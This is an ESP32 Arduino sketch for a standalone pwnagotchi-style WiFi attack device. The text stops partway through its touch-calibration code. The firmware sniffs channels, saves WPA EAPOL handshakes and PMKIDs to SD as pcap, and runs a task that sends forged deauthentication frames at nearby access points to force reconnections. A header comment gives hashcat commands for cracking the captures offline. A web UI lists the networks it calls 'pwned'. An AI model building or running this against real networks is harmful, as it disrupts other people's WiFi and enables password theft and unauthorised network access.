/*
 * FancyGotchi CYD v2.0 — Standalone WiFi Handshake Capture
 * ESP32-2432S028R  |  ST7789 320x240  |  XPT2046 touch  |  microSD
 *
 * This device IS the pwnagotchi. No Raspberry Pi needed.
 *
 * Touch zones:
 *   Top-LEFT    = cycle theme
 *   Top-RIGHT   = cycle face pack
 *   Bottom-LEFT = toggle web UI (http://192.168.4.1)
 *   Bottom-RIGHT= toggle deauth on/off
 *
 * TFT_eSPI User_Setup.h must be configured for this board:
 *   #define ST7789_DRIVER
 *   #define TFT_WIDTH  240 / TFT_HEIGHT 320
 *   #define TFT_MOSI 13 / TFT_SCLK 14 / TFT_CS 15 / TFT_DC 2
 *   #define TFT_MISO 12 / TFT_BL 21
 *   (A pre-filled User_Setup.h is included with this sketch)
 *
 * After capture, crack offline:
 *   hcxpcapngtool -o hash.hc22000 /handshakes/*.pcap
 *   hashcat -m 22000 hash.hc22000 wordlist.txt
 */

// ================================================================
// Includes — FS.h MUST come before WebServer.h and SD.h
// ================================================================
#include <Arduino.h>
#include <FS.h>
#include <SD.h>
#include <SPI.h>
#include <SPIFFS.h>
#include <Preferences.h>
#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>

// ================================================================
// Structs — ALL defined here first so the Arduino IDE preprocessor
// sees them before generating forward declarations for any function
// that returns these types (ApRecord*, FaceSet*, Theme*, etc.)
// ================================================================
struct ApRecord {
  uint8_t  bssid[6];
  char     ssid[33];
  int8_t   rssi;
  uint8_t  channel;
  uint32_t lastSeen;
  uint16_t eapolCount;
  bool     hasHandshake;
  bool     hasPmkid;
};

struct FaceSet {
  const char* name;
  const char* idle[3];
  const char* scan[3];
  const char* excited[3];
  const char* happy[3];
  const char* intense[3];
  const char* bored[3];
  const char* sleep[3];
};

struct ThemeColors {
  uint16_t bg, panel, accent, text, textDim, face;
  uint16_t ok, err, barFill, barBg;
};

struct Theme {
  const char*  name;
  ThemeColors  c;
  bool         corners;
  bool         scanlines;
};

struct TouchCal { int16_t xMin,xMax,yMin,yMax; bool valid; };

// ================================================================
// config.h — inlined
// ================================================================
#define CHANNEL_HOP_INTERVAL_MS  200
#define CHANNEL_MIN              1
#define CHANNEL_MAX              13

#define MAX_APS           64
#define MAX_STATIONS      64
#define BEACON_TIMEOUT_S  30

#define SD_CLK   18
#define SD_MISO  19
#define SD_MOSI  23

#define DISPLAY_ROTATION  1
#define PIN_BL            21
#define BL_FREQ           5000
#define BL_BITS           8
#define BL_BRIGHTNESS     220

#define TOUCH_CLK   25
#define TOUCH_MISO  39
#define TOUCH_MOSI  32
#define TOUCH_CS    33
#define TOUCH_IRQ   36
#define TOUCH_DEBOUNCE_MS  500

#define PIN_LED_R  4
#define PIN_LED_G  16
#define PIN_LED_B  17

#define DRAW_INTERVAL_MS   150
#define ANIM_FRAME_MS      120

// ================================================================
// font.h — inlined
// ================================================================
#define FONT_FACE        2
#define FONT_FACE_SIZE   2

#define FONT_STATUS      2
#define FONT_STATUS_SIZE 1

#define FONT_MOOD        1
#define FONT_MOOD_SIZE   1

#define FONT_STATS       2
#define FONT_STATS_SIZE  1

#define FONT_TOPBAR      2
#define FONT_TOPBAR_SIZE 1

#define FONT_BOTBAR      1
#define FONT_BOTBAR_SIZE 1

#define FONT_LABEL       1
#define FONT_LABEL_SIZE  1

#define FONT_SPLASH_TITLE  4
#define FONT_SPLASH_SUB    2
#define FONT_SPLASH_HINT   1

// ================================================================
// theme.h — inlined
// ================================================================


#define RGB(r,g,b) ((uint16_t)(((r&0xF8)<<8)|((g&0xFC)<<3)|(b>>3)))

static const Theme THEMES[] = {
  { "default", { RGB(18,18,24),   RGB(28,28,36),   RGB(0,255,180),
                 RGB(220,220,220), RGB(100,100,120), RGB(0,255,180),
                 RGB(0,220,80),    RGB(255,60,60),
                 RGB(0,200,160),   RGB(40,40,55) },  true,  false },
  { "cyber",   { RGB(0,0,20),     RGB(0,10,35),    RGB(0,200,255),
                 RGB(180,240,255), RGB(60,100,130),  RGB(0,200,255),
                 RGB(0,255,120),   RGB(255,50,50),
                 RGB(0,180,255),   RGB(0,20,40)  },  true,  true  },
  { "retro",   { RGB(20,10,0),    RGB(32,16,0),    RGB(255,140,0),
                 RGB(255,180,80),  RGB(140,80,20),   RGB(255,160,0),
                 RGB(180,220,0),   RGB(255,60,0),
                 RGB(200,120,0),   RGB(40,20,0)  },  false, true  },
  { "matrix",  { RGB(0,8,0),      RGB(0,14,0),     RGB(0,255,0),
                 RGB(0,220,0),     RGB(0,100,0),     RGB(0,255,0),
                 RGB(0,200,0),     RGB(255,50,50),
                 RGB(0,180,0),     RGB(0,25,0)   },  false, true  },
};
#define THEME_COUNT 4

static uint8_t _themeIdx = 0;
static inline const Theme*  activeTheme()     { return &THEMES[_themeIdx]; }
static inline const char*   activeThemeName() { return THEMES[_themeIdx].name; }
static inline void           themeInit()       { _themeIdx = 0; }
static inline void           themeCycleNext()  { _themeIdx = (_themeIdx + 1) % THEME_COUNT; }

// ================================================================
// faces.h — inlined
// ================================================================

// All faces use plain ASCII only — TFT_eSPI font 2 cannot render
// multi-byte UTF-8 characters (they show as blank or garbage).
static const FaceSet FACE_SETS[] = {
  { "classic",
    { "(^_^)",    "( -_-)",    "(= =)"     },  // idle
    { "(o_o)",    "( o.o )",   "(._o)"     },  // scan
    { "(^o^)!",   "(*_*)",     "(>_<)!"    },  // excited
    { "(^v^)",    "(: D",      "( ^u^)"    },  // happy
    { "(o_O)",    "(!_!)",     "(>_<)"     },  // intense
    { "(-__-)",   "(-_-)",     "(._.) "    },  // bored
    { "(-zzz-)",  "( -.- )",   "( zzz )"  },  // sleep
  },
  { "robot",
    { "[- _ -]",  "[ . _ . ]", "[-_-]"    },
    { "[o_O]",    "[? _ ?]",   "[=_=]"    },
    { "[^o^]!!",  "[!!!]",     "[*_*]"    },
    { "[^_^]",    "[ :D ]",    "[>v<]"    },
    { "[>_<]",    "[X_X]",     "[!_!]"    },
    { "[._.]",    "[-_-]",     "[zzz]"    },
    { "[Zzz]",    "[- -]",     "[...z]"   },
  },
  { "ghost",
    { "( o_o )",  "( ._. )",   "( -.- )"  },
    { "( o.o )",  "( -.o )",   "( o_- )"  },
    { "( ^o^ )",  "( *o* )",   "( ^u^ )"  },
    { "( ^_^ )",  "( :D  )",   "( ^-^ )"  },
    { "( o_O )",  "( !_! )",   "( >_< )"  },
    { "( ._. )",  "( -_- )",   "( meh )"  },
    { "( zzz )",  "( -_- )",   "( ...z )" },
  },
  { "demon",
    { "(>_<)",    "( ._. )",   "( o_o)"   },
    { "(o_O)",    "(>_o)",     "(-_-)"    },
    { "(>:D)",    "(*_*)",     "(^o^)!"   },
    { "(>:)",     "( ^_-)",    "(:D"      },
    { "(X_X)",    "( >_< )",   "(>o<)"    },
    { "(-_-)",    "( -.- )",   "(._.)"    },
    { "(.zZ)",    "( -_- )",   "(-zzz-)"  },
  },
  { "pixel",
    { ":)",       ":|",        "(= =)"    },
    { ":o",       ":/",        "=_="      },
    { ":D",       "=D",        ":DDDDD"   },
    { ":)",       "=)",        ":]"       },
    { ">:(",      ">:O",       ":@"       },
    { ":/",       "-_-",       ":|"       },
    { "-.-",      ":|zzz",     "=.="      },
  },
};
#define FACE_SET_COUNT  ((int)(sizeof(FACE_SETS)/sizeof(FACE_SETS[0])))

static uint8_t _faceSetIdx = 0;
static inline const FaceSet* activeFaceSet()     { return &FACE_SETS[_faceSetIdx]; }
static inline const char*    activeFaceSetName() { return FACE_SETS[_faceSetIdx].name; }
static inline uint8_t        activeFaceSetIdx()  { return _faceSetIdx; }
static inline void            faceSetCycleNext()  { _faceSetIdx = (_faceSetIdx + 1) % FACE_SET_COUNT; }
static inline void            faceSetSet(uint8_t i) { if (i < FACE_SET_COUNT) _faceSetIdx = i; }

// ================================================================
// sd_pcap.h — inlined
// ================================================================
#define PCAP_MAGIC      0xA1B2C3D4
#define PCAP_VER_MAJ    2
#define PCAP_VER_MIN    4
#define PCAP_SNAPLEN    65535
#define PCAP_DLT_80211  105

static SPIClass  _sdSPI(HSPI);
static bool      sdReady    = false;
static uint32_t  savedCount = 0;
static char      sdStatus[32] = "SD: init";
static bool      _sdEnabled   = true;

static void _writePcapGlobalHeader(File& f) {
  uint32_t magic   = PCAP_MAGIC;
  uint16_t vmaj    = PCAP_VER_MAJ, vmin = PCAP_VER_MIN;
  int32_t  tz      = 0;
  uint32_t sigfigs = 0, snaplen = PCAP_SNAPLEN, dlt = PCAP_DLT_80211;
  f.write((uint8_t*)&magic,   4); f.write((uint8_t*)&vmaj,    2);
  f.write((uint8_t*)&vmin,    2); f.write((uint8_t*)&tz,      4);
  f.write((uint8_t*)&sigfigs, 4); f.write((uint8_t*)&snaplen, 4);
  f.write((uint8_t*)&dlt,     4);
}

static void _writePcapPkt(File& f, const uint8_t* data, uint32_t len) {
  uint32_t ts_sec = millis() / 1000;
  uint32_t ts_us  = (millis() % 1000) * 1000;
  f.write((uint8_t*)&ts_sec, 4); f.write((uint8_t*)&ts_us, 4);
  f.write((uint8_t*)&len,    4); f.write((uint8_t*)&len,   4);
  f.write(data, len);
}

static void _sanitise(const char* in, char* out, size_t maxlen) {
  size_t j = 0;
  for (size_t i = 0; in[i] && j < maxlen - 1; i++) {
    char c = in[i];
    if ((c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_')
      out[j++] = c;
    else if (c != ':')
      out[j++] = '_';
  }
  out[j] = '\0';
}

static bool sdInit() {
  _sdSPI.begin(SD_CLK, SD_MISO, SD_MOSI, -1);
  delay(20);
  const uint8_t cs[] = { 5, 22, 4, 2, 15, 13 };
  for (uint8_t i = 0; i < sizeof(cs); i++) {
    SD.end(); delay(20);
    Serial.printf("[SD] Trying CS=GPIO%d...", cs[i]);
    if (SD.begin(cs[i], _sdSPI, 4000000)) {
      uint64_t mb = SD.cardSize() / (1024*1024);
      Serial.printf("OK %lluMB\n", mb);
      snprintf(sdStatus, sizeof(sdStatus), "SD:%lluMB", mb);
      if (!SD.exists("/handshakes")) SD.mkdir("/handshakes");
      File d = SD.open("/handshakes");
      while (true) { File f = d.openNextFile(); if (!f) break; if (!f.isDirectory()) savedCount++; f.close(); }
      d.close();
      sdReady = true;
      return true;
    }
    Serial.println("fail");
  }
  strlcpy(sdStatus, "SD: none", sizeof(sdStatus));
  sdReady = false;
  return false;
}

static bool sdSaveHandshake(const char* bssid, const char* ssid,
                             const uint8_t* data, uint16_t len) {
  if (!sdReady || !_sdEnabled || !data || len == 0) return false;
  char b[20], s[36];
  _sanitise(bssid, b, sizeof(b));
  _sanitise(ssid,  s, sizeof(s));
  if (s[0] == '\0') strlcpy(s, "hidden", sizeof(s));
  char path[80];
  snprintf(path, sizeof(path), "/handshakes/%s_%s.pcap", b, s);
  bool exists = SD.exists(path);
  File f = SD.open(path, exists ? FILE_APPEND : FILE_WRITE);
  if (!f) return false;
  if (!exists) _writePcapGlobalHeader(f);
  _writePcapPkt(f, data, len);
  f.close();
  if (!exists) savedCount++;
  snprintf(sdStatus, sizeof(sdStatus), "SD:%lu pwned", savedCount);
  return true;
}

static inline bool        sdIsReady()   { return sdReady; }
static inline uint32_t    sdSaved()     { return savedCount; }
static inline const char* sdGetStatus() { return sdStatus; }
static inline void sdToggle() {
  _sdEnabled = !_sdEnabled;
  if (_sdEnabled) snprintf(sdStatus, sizeof(sdStatus), "SD:on %lu", savedCount);
  else            strlcpy(sdStatus, "SD:paused", sizeof(sdStatus));
}

// ================================================================
// wifi_capture.h — inlined
// ================================================================
static ApRecord  _aps[MAX_APS];
static uint8_t   _apCount      = 0;
static uint32_t  _totalPackets = 0;
static uint32_t  _eapolTotal   = 0;
static uint32_t  _pmkidTotal   = 0;
static uint32_t  _deauthTotal  = 0;
static uint32_t  _beaconTotal  = 0;
static uint8_t   _currentChan  = 1;
static uint32_t  _lastHop      = 0;
static bool      _capturing    = true;

typedef struct {
  uint8_t  frame_ctrl[2]; uint16_t duration;
  uint8_t  addr1[6]; uint8_t addr2[6]; uint8_t addr3[6];
  uint16_t seq_ctrl;
} __attribute__((packed)) wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr; uint8_t payload[0];
} __attribute__((packed)) wifi_ieee80211_packet_t;

#define FRAME_TYPE_MGMT          0x00
#define FRAME_TYPE_DATA          0x02
#define FRAME_SUBTYPE_BEACON     0x08
#define FRAME_SUBTYPE_DEAUTH     0x0C
#define FRAME_SUBTYPE_PROBE_REQ  0x04
#define FRAME_SUBTYPE_ASSOC_REQ  0x00
#define LLC_SNAP_EAPOL           0x888E

static void bssidToStr(const uint8_t* b, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0],b[1],b[2],b[3],b[4],b[5]);
}
static bool bssidEqual(const uint8_t* a, const uint8_t* b) { return memcmp(a,b,6)==0; }

static ApRecord* findOrAddAp(const uint8_t* bssid) {
  for (uint8_t i = 0; i < _apCount; i++)
    if (bssidEqual(_aps[i].bssid, bssid)) return &_aps[i];
  if (_apCount >= MAX_APS) {
    uint32_t oldest = UINT32_MAX; int8_t oldestIdx = -1;
    for (uint8_t i = 0; i < _apCount; i++) {
      if (_aps[i].hasHandshake || _aps[i].hasPmkid) continue;
      if (_aps[i].lastSeen < oldest) { oldest = _aps[i].lastSeen; oldestIdx = i; }
    }
    if (oldestIdx < 0) oldestIdx = 0;
    ApRecord* ap = &_aps[oldestIdx];
    memset(ap, 0, sizeof(ApRecord)); memcpy(ap->bssid, bssid, 6); return ap;
  }
  ApRecord* ap = &_aps[_apCount++];
  memset(ap, 0, sizeof(ApRecord)); memcpy(ap->bssid, bssid, 6); return ap;
}

static void parseBeacon(const uint8_t* payload, uint16_t len, ApRecord* ap) {
  if (len < 12) return;
  const uint8_t* ie = payload + 12, *end = payload + len;
  while (ie + 2 <= end) {
    uint8_t id = ie[0], iel = ie[1];
    if (ie + 2 + iel > end) break;
    if (id == 0) {
      uint8_t ssidLen = min(iel, (uint8_t)32);
      memcpy(ap->ssid, ie+2, ssidLen); ap->ssid[ssidLen] = '\0';
      for (uint8_t i = 0; i < ssidLen; i++) if (ap->ssid[i]<32||ap->ssid[i]>126) ap->ssid[i]='_';
    }
    if (id == 3 && iel >= 1) { uint8_t ch=ie[2]; if (ch>=1&&ch<=13) ap->channel=ch; }
    ie += 2 + iel;
  }
}

static bool isEapol(const uint8_t* data, uint16_t len) {
  if (len < 28) return false;
  uint8_t fc0=data[0], fc1=data[1];
  uint8_t ftype=(fc0>>2)&0x03;
  if (ftype != FRAME_TYPE_DATA) return false;
  uint8_t subtype=(fc0>>4)&0x0F;
  if (subtype & 0x04) return false;
  bool toDS=(fc1&0x01)!=0, fromDS=(fc1&0x02)!=0;
  uint8_t hdrLen=24;
  if (subtype & 0x08) hdrLen+=2;
  if (toDS && fromDS) hdrLen+=6;
  if (len < (uint16_t)(hdrLen+8)) return false;
  for (uint8_t off=0; off<=6; off++) {
    uint16_t pos=hdrLen+off;
    if (pos+8>len) break;
    const uint8_t* p=data+pos;
    if (p[0]==0xAA&&p[1]==0xAA&&p[2]==0x03&&p[3]==0x00&&p[4]==0x00&&p[5]==0x00&&p[6]==0x88&&p[7]==0x8E) return true;
    if (p[0]==0x88&&p[1]==0x8E) return true;
  }
  return false;
}

static bool hasPmkid(const uint8_t* payload, uint16_t len) {
  const uint8_t* ie=payload, *end=payload+len;
  while (ie+2<=end) {
    uint8_t id=ie[0], iel=ie[1];
    if (ie+2+iel>end) break;
    if (id==48&&iel>=20) {
      const uint8_t* rsn=ie+2;
      if (iel<4){ie+=2+iel;continue;}
      uint16_t pwCnt=rsn[2]|(rsn[3]<<8); uint16_t off=4+pwCnt*4;
      if (off+4>iel){ie+=2+iel;continue;}
      uint16_t akmCnt=rsn[off]|(rsn[off+1]<<8); off+=2+akmCnt*4+2;
      if (off+2>iel){ie+=2+iel;continue;}
      uint16_t pmkidCnt=rsn[off]|(rsn[off+1]<<8);
      if (pmkidCnt>0) return true;
    }
    ie+=2+iel;
  }
  return false;
}

static void IRAM_ATTR wifiSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!_capturing) return;
  if (type==WIFI_PKT_CTRL) { _totalPackets++; return; }
  if (type!=WIFI_PKT_MGMT&&type!=WIFI_PKT_DATA&&type!=WIFI_PKT_MISC) return;
  const wifi_promiscuous_pkt_t* pkt=(const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* data=pkt->payload; uint16_t len=pkt->rx_ctrl.sig_len;
  if (len<10) return;
  _totalPackets++;
  if (_totalPackets%200==0) {
    static uint32_t _df=0; if (type==WIFI_PKT_DATA) _df++;
    Serial.printf("[CAP] pkts=%lu aps=%d eapol=%lu data=%lu ch=%d\n",_totalPackets,_apCount,_eapolTotal,_df,_currentChan);
  }
  uint8_t fc0=data[0],fc1=data[1],ftype=(fc0>>2)&0x03,fsub=(fc0>>4)&0x0F;
  if (ftype==FRAME_TYPE_MGMT) {
    const wifi_ieee80211_mac_hdr_t* hdr=(wifi_ieee80211_mac_hdr_t*)data;
    if (fsub==FRAME_SUBTYPE_BEACON&&len>36) {
      _beaconTotal++; ApRecord* ap=findOrAddAp(hdr->addr3);
      ap->rssi=pkt->rx_ctrl.rssi; ap->lastSeen=millis();
      if (ap->channel==0) ap->channel=_currentChan;
      if (ap->ssid[0]=='\0') parseBeacon(data+36,len-36,ap);
      return;
    }
    if (fsub==FRAME_SUBTYPE_DEAUTH) { _deauthTotal++; return; }
    if (fsub==FRAME_SUBTYPE_ASSOC_REQ&&len>28) {
      ApRecord* ap=findOrAddAp(hdr->addr1);
      if (hasPmkid(data+28,len-28)) {
        _pmkidTotal++; ap->hasPmkid=true; ap->lastSeen=millis();
        char bs[18]; bssidToStr(ap->bssid,bs);
        sdSaveHandshake(bs,ap->ssid[0]?ap->ssid:"hidden",data,len);
        Serial.printf("[CAP] PMKID: %s (%s)\n",ap->ssid,bs);
      }
      return;
    }
  }
  if (ftype==FRAME_TYPE_DATA&&isEapol(data,len)) {
    _eapolTotal++;
    const wifi_ieee80211_mac_hdr_t* hdr=(wifi_ieee80211_mac_hdr_t*)data;
    ApRecord* ap=findOrAddAp(hdr->addr3); ap->eapolCount++; ap->lastSeen=millis();
    if (!ap->hasHandshake) {
      const uint8_t* ep=data, *ep_end=data+len;
      while (ep+2<ep_end) { if (ep[0]==0x88&&ep[1]==0x8E){ep+=2;break;} ep++; }
      if (ep+7<=ep_end&&ep[1]==0x03) { uint16_t ki=((uint16_t)ep[5]<<8)|ep[6]; if (ki&0x0100) ap->hasHandshake=true; }
    }
    char bs[18]; bssidToStr(ap->bssid,bs);
    sdSaveHandshake(bs,ap->ssid[0]?ap->ssid:"hidden",data,len);
    Serial.printf("[CAP] EAPOL #%lu: %s (%s) len=%d\n",_eapolTotal,ap->ssid[0]?ap->ssid:"hidden",bs,len);
    if (_eapolTotal<=2) { Serial.print("[CAP] hex: "); for(uint8_t i=0;i<min((uint16_t)48,len);i++) Serial.printf("%02X ",data[i]); Serial.println(); }
  }
}

static QueueHandle_t     _deauthQueue = nullptr;
static SemaphoreHandle_t _wifiMux     = nullptr;

struct DeauthTarget { uint8_t bssid[6]; uint8_t channel; };

static void deauthTask(void* param) {
  DeauthTarget t;
  while (true) {
    if (xQueueReceive(_deauthQueue,&t,pdMS_TO_TICKS(500))==pdTRUE) {
      uint8_t frame[26]={0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
                         0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00};
      memcpy(frame+10,t.bssid,6); memcpy(frame+16,t.bssid,6);
      if (xSemaphoreTake(_wifiMux,pdMS_TO_TICKS(100))==pdTRUE) {
        esp_wifi_set_channel(t.channel,WIFI_SECOND_CHAN_NONE); vTaskDelay(pdMS_TO_TICKS(2));
        for (uint8_t i=0;i<3;i++){esp_wifi_80211_tx(WIFI_IF_STA,frame,sizeof(frame),false);vTaskDelay(pdMS_TO_TICKS(3));}
        xSemaphoreGive(_wifiMux);
      }
      char bs[18]; bssidToStr(t.bssid,bs); Serial.printf("[DEAUTH] -> %s ch%d\n",bs,t.channel);
    }
  }
}

static uint8_t  _deauthApIdx = 0;
static uint32_t _lastDeauth  = 0;
#define DEAUTH_INTERVAL_MS  2000

static void deauthTick() {
  if (_apCount==0||_deauthQueue==nullptr) return;
  uint32_t now=millis(); if (now-_lastDeauth<DEAUTH_INTERVAL_MS) return;
  _lastDeauth=now;
  for (uint8_t tried=0;tried<_apCount;tried++) {
    _deauthApIdx=(_deauthApIdx+1)%_apCount;
    ApRecord* ap=&_aps[_deauthApIdx];
    if (!ap->hasHandshake&&!ap->hasPmkid&&ap->channel>=1&&ap->channel<=13&&(millis()-ap->lastSeen)<30000) {
      DeauthTarget t; memcpy(t.bssid,ap->bssid,6); t.channel=ap->channel;
      xQueueSend(_deauthQueue,&t,0); return;
    }
  }
}

static void captureChannelTick() {
  uint32_t now=millis();
  if (now-_lastHop>=CHANNEL_HOP_INTERVAL_MS) {
    _lastHop=now;
    if (_deauthQueue&&uxQueueMessagesWaiting(_deauthQueue)>0) return;
    _currentChan++; if (_currentChan>CHANNEL_MAX) _currentChan=CHANNEL_MIN;
    if (_wifiMux&&xSemaphoreTake(_wifiMux,0)==pdTRUE) { esp_wifi_set_channel(_currentChan,WIFI_SECOND_CHAN_NONE); xSemaphoreGive(_wifiMux); }
  }
}

static void captureInit() {
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(100);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(wifiSnifferCb);
  wifi_promiscuous_filter_t filt; filt.filter_mask=WIFI_PROMIS_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_filter(&filt);
  wifi_promiscuous_filter_t cf; cf.filter_mask=WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_ctrl_filter(&cf);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(_currentChan,WIFI_SECOND_CHAN_NONE);
  _wifiMux=xSemaphoreCreateMutex();
  _deauthQueue=xQueueCreate(4,sizeof(DeauthTarget));
  xTaskCreatePinnedToCore(deauthTask,"deauth",4096,nullptr,1,nullptr,0);
  Serial.println("[CAP] Promiscuous mode active"); Serial.printf("[CAP] Channel %d\n",_currentChan);
}

static inline uint8_t   captureApCount()  { return _apCount; }
static inline uint32_t  captureEapol()    { return _eapolTotal; }
static inline uint32_t  capturePmkid()    { return _pmkidTotal; }
static inline uint32_t  captureDeauth()   { return _deauthTotal; }
static inline uint32_t  capturePackets()  { return _totalPackets; }
static inline uint8_t   captureChannel()  { return _currentChan; }
static inline ApRecord* captureAps()      { return _aps; }

static inline uint16_t capturePwned() {
  uint16_t n=0;
  for (uint8_t i=0;i<_apCount;i++) if (_aps[i].hasHandshake||_aps[i].hasPmkid) n++;
  return n;
}
static inline ApRecord* captureBestAp() {
  if (_apCount==0) return nullptr;
  uint8_t best=0;
  for (uint8_t i=1;i<_apCount;i++) if (_aps[i].rssi>_aps[best].rssi) best=i;
  return &_aps[best];
}

// ================================================================
// web_ui.h — inlined
// ================================================================
#define WEBUI_SSID          "FancyGotchi-CYD"
#define WEBUI_PASS          "pwnagotchi"
#define WEBUI_PORT          80
#define WEBUI_TIMEOUT_MS    (10UL*60UL*1000UL)

static WebServer  _webServer(WEBUI_PORT);
static bool       _webUiActive  = false;
static uint32_t   _webUiStartMs = 0;

static void handleRoot() {
  uint32_t upSec=millis()/1000, upH=upSec/3600, upM=(upSec%3600)/60, upS=upSec%60;
  ApRecord* aps=captureAps(); uint8_t apCnt=captureApCount();
  String rows="";
  for (uint8_t i=0;i<apCnt;i++) {
    ApRecord* ap=&aps[i]; char bstr[18]; bssidToStr(ap->bssid,bstr);
    String status="", badge="";
    if (ap->hasPmkid)       { status="pmkid"; badge="<span class='badge pmkid'>PMKID</span>"; }
    else if (ap->hasHandshake){ status="pwned"; badge="<span class='badge pwned'>PWNED</span>"; }
    else                    {                  badge="<span class='badge scan'>SCAN</span>"; }
    uint32_t ageSec=(millis()-ap->lastSeen)/1000;
    rows+="<tr class='"+status+"'><td>"+String(ap->ssid[0]?ap->ssid:"<hidden>")+"</td>"
         +"<td class='mono'>"+String(bstr)+"</td><td>"+String(ap->channel)+"</td>"
         +"<td>"+String(ap->rssi)+" dBm</td><td>"+String(ap->eapolCount)+"</td>"
         +"<td>"+badge+"</td><td>"+String(ageSec)+"s ago</td></tr>\n";
  }
  String html=R"(<!DOCTYPE html><html><head>
<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<meta http-equiv='refresh' content='5'><title>FancyGotchi CYD</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#c8ffc8;font-family:monospace;font-size:13px;padding:12px}
h1{color:#00ff88;font-size:18px;margin-bottom:4px}.sub{color:#556655;font-size:11px;margin-bottom:14px}
.stats{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
.stat{background:#0f1f0f;border:1px solid #1a3a1a;border-radius:6px;padding:8px 14px;min-width:80px;text-align:center}
.stat .val{font-size:22px;color:#00ff88;font-weight:bold}.stat .lbl{font-size:10px;color:#446644;margin-top:2px}
table{width:100%;border-collapse:collapse;font-size:12px}
th{background:#0f1f0f;color:#446644;padding:6px 8px;text-align:left;border-bottom:1px solid #1a3a1a;position:sticky;top:0}
td{padding:5px 8px;border-bottom:1px solid #0f180f}tr:hover td{background:#0f1f0f}
tr.pwned td{color:#00ff88}tr.pmkid td{color:#ffcc00}
.mono{font-family:monospace;letter-spacing:0.5px}
.badge{display:inline-block;padding:2px 7px;border-radius:3px;font-size:10px;font-weight:bold}
.badge.pwned{background:#003320;color:#00ff88;border:1px solid #00ff88}
.badge.pmkid{background:#332200;color:#ffcc00;border:1px solid #ffcc00}
.badge.scan{background:#111;color:#334433;border:1px solid #222}
.uptime{color:#334433;font-size:11px;margin-bottom:14px}
.footer{margin-top:16px;color:#222;font-size:10px;text-align:center}
@media(max-width:600px){.stat .val{font-size:18px}.stats{gap:6px}}</style></head><body>
<h1>&#x1F47E; FancyGotchi CYD</h1>
<div class='sub'>passive wifi handshake capture — auto-refresh 5s</div>
<div class='uptime'>uptime: )";
  html+=String(upH)+"h "+String(upM)+"m "+String(upS)+"s</div>";
  html+="<div class='stats'>"
        "<div class='stat'><div class='val'>"+String(apCnt)+"</div><div class='lbl'>APs</div></div>"
        "<div class='stat'><div class='val'>"+String(captureEapol())+"</div><div class='lbl'>EAPOL</div></div>"
        "<div class='stat'><div class='val'>"+String(capturePmkid())+"</div><div class='lbl'>PMKID</div></div>"
        "<div class='stat'><div class='val'>"+String(capturePwned())+"</div><div class='lbl'>PWNED</div></div>"
        "<div class='stat'><div class='val'>"+String(capturePackets())+"</div><div class='lbl'>PKTS</div></div>"
        "<div class='stat'><div class='val'>CH"+String(captureChannel())+"</div><div class='lbl'>CHAN</div></div>"
        "</div>";
  html+="<table><thead><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th>"
        "<th>EAPOL</th><th>Status</th><th>Last Seen</th></tr></thead><tbody>";
  html+=rows+"</tbody></table>";
  html+="<div class='footer'>FancyGotchi CYD v2.0 &mdash; touch bottom-left on device to stop AP</div></body></html>";
  _webServer.send(200,"text/html",html);
}

static void handleJson() {
  ApRecord* aps=captureAps(); uint8_t apCnt=captureApCount();
  String j="{\"uptime\":"+String(millis()/1000)+",\"aps\":"+String(apCnt)
           +",\"eapol\":"+String(captureEapol())+",\"pmkid\":"+String(capturePmkid())
           +",\"pwned\":"+String(capturePwned())+",\"pkts\":"+String(capturePackets())
           +",\"channel\":"+String(captureChannel())+",\"ap_list\":[";
  for (uint8_t i=0;i<apCnt;i++) {
    ApRecord* ap=&aps[i]; char bstr[18]; bssidToStr(ap->bssid,bstr);
    if (i) j+=",";
    j+="{\"ssid\":\""+String(ap->ssid[0]?ap->ssid:"")
      +"\",\"bssid\":\""+String(bstr)
      +"\",\"ch\":"+String(ap->channel)
      +",\"rssi\":"+String(ap->rssi)
      +",\"eapol\":"+String(ap->eapolCount)
      +",\"pwned\":"+String(ap->hasHandshake||ap->hasPmkid?"true":"false")+"}";
  }
  j+="]}";
  _webServer.send(200,"application/json",j);
}

static inline bool webUiIsActive() { return _webUiActive; }

static void webUiStart() {
  if (_webUiActive) return;
  Serial.println("[Web] Starting AP...");
  WiFi.mode(WIFI_AP_STA); WiFi.softAP(WEBUI_SSID,WEBUI_PASS);
  Serial.printf("[Web] AP up: %s  IP: %s\n",WEBUI_SSID,WiFi.softAPIP().toString().c_str());
  _webServer.on("/",     handleRoot);
  _webServer.on("/json", handleJson);
  _webServer.begin(); _webUiActive=true; _webUiStartMs=millis();
}

static void webUiStop() {
  if (!_webUiActive) return;
  _webServer.stop(); WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA);
  _webUiActive=false; Serial.println("[Web] AP stopped");
}

static void webUiTick() {
  if (!_webUiActive) return;
  if (millis()-_webUiStartMs>WEBUI_TIMEOUT_MS) { Serial.println("[Web] Timeout"); webUiStop(); return; }
  _webServer.handleClient();
}

// ================================================================
// touch_calibrate.h — inlined
// ================================================================
static Preferences _calPrefs;
static TouchCal _cal = {300,3800,300,3800,false};

static bool calLoad() {
  _calPrefs.begin("tcal",true);
  bool v=_calPrefs.getBool("v",false);
  if (!v){_calPrefs.end();return false;}
  _cal.xMin=_calPrefs.getShort("x0",300); _cal.xMax=_calPrefs.getShort("x1",3800);
